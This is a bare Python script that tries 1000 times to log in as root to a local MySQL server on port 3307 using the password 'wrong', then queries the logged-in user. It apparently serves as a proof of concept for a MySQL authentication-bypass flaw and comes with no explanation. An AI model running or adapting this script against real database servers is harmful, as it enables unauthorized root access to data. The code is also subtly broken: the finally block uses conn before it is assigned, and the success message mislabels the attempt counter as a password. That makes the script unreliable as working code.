import pymysql


host = '127.0.0.1'
port = 3307
user = 'root'
password = 'wrong'

attempts = 1000

for i in range(1, attempts+1):
    try:
        conn = pymysql.connect(host=host, port=port, user=user, password=password)
        print(f"login success password: {i}")


        with conn.cursor() as cursor:
            cursor.execute("SELECT user()")
            result = cursor.fetchone()
            print("login user:", result[0])
            break
    except pymysql.MySQLError as e:
        print(f"try {i} - login fail: {e}")
    finally:
        if conn:
            conn.close()